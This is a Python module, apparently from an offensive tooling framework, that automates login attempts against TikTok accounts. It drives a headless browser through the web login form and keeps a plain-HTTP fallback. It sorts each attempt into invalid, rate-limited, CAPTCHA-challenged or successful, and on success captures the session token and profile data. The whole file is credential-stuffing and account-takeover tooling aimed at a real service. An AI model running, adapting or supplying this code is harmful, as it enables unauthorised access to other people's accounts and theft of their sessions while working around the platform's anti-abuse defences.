"""TikTok Credential Tester — headless-browser login flow.

TikTok's login API requires ByteDance signatures (X-Bogus/X-Gorgon/X-Ladon),
msToken and a registered device, so plain-HTTP credential checks no longer
work. This module drives a real Chromium via Playwright through the web login
form and classifies the outcome (invalid credentials / rate limit / challenge /
success) from the rendered page.
"""
import json
import uuid

from webforg.modules.auth.base_login_tester import BaseSocialLoginTester, LoginResult
from rich.console import Console

console = Console()

# Kept as a fallback for environments without Playwright; the plain-HTTP
# endpoint no longer accepts logins (needs ByteDance signing).
_LOGIN_API = "https://www.tiktok.com/api/auth/login/"


class Exploit(BaseSocialLoginTester):
    name = "TikTok Credential Tester"
    description = "Tests credentials against TikTok via a headless browser login flow."
    author = "K0uR1i"
    rank = "manual"

    platform_name = "tiktok"
    login_url = _LOGIN_API
    browser_login_url = "https://www.tiktok.com/login/phone-or-email/email"
    username_selector = "input[name=username]"
    password_selector = "input[type=password]"
    submit_selectors = ("button[type=submit]", "button:has-text('Log in')")
    browser_login_paths = ("/login",)
    challenge_frame_keywords = ("captcha", "verify", "byteoversea", "bytedance", "risk")
    rate_markers = (
        "maximum number of attempts", "too many attempts", "try again later",
        "temporarily", "many login attempts", "try again in",
    )
    challenge_markers = (
        "captcha", "security check", "unusual activity", "confirm it's you",
        "slide to", "complete the", "are you a robot", "validate your identity",
        "verify", "verification", "prove you're not a robot",
    )
    invalid_markers = (
        "invalid username or password", "incorrect password", "invalid account",
        "username or password", "doesn't match", "incorrect username",
        "account not found", "account does not exist", "not found",
    )

    # ---- legacy HTTP path (kept as fallback when no browser is available) ----

    def _build_request_headers(self) -> dict:
        return {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://www.tiktok.com", "Referer": "https://www.tiktok.com/login"}

    def _build_login_payload(self, username: str, password: str) -> dict:
        return {"account": username, "password": password, "client_id": "7071e8c4b5d14a5c8a7b3f6d9c2e0a4b", "device_id": str(uuid.uuid4().int >> 96), "aid": "1988"}

    def parse_login_response(self, response, username: str, password: str) -> LoginResult:
        result = LoginResult(username=username, password=password, success=False, status_code=response.status_code)
        try:
            data = response.json()
        except json.JSONDecodeError:
            result.error_type = "invalid_response"
            return result
        if data.get("data", {}).get("token"):
            result.success = True
            result.session_token = data["data"]["token"]
            result.profile_data = {"user_id": data["data"].get("user_id", ""), "username": data["data"].get("username", username)}
            return result
        if response.status_code == 429 or data.get("code") == 429:
            result.error_type = "rate_limited"
            return result
        if data.get("message") == "invalid_credentials":
            result.error_type = "invalid_credentials"
            return result
        if response.status_code >= 400:
            result.error_type = f"blocked: HTTP {response.status_code}"
            return result
        status_msg = data.get("status_msg") or ""
        if status_msg:
            if "url doesn't match" in status_msg.lower():
                result.error_type = "endpoint_invalid"
            else:
                result.error_type = f"blocked: {status_msg}"
            return result
        if "log_pb" in data and "data" not in data:
            result.error_type = "blocked"
            return result
        if "rate" in str(data).lower():
            result.error_type = "rate_limited"
            return result
        if "verification" in str(data).lower() or "captcha" in str(data).lower():
            result.error_type = "challenge"
            return result
        result.error_type = f"unknown: {json.dumps(data)[:120]}"
        return result
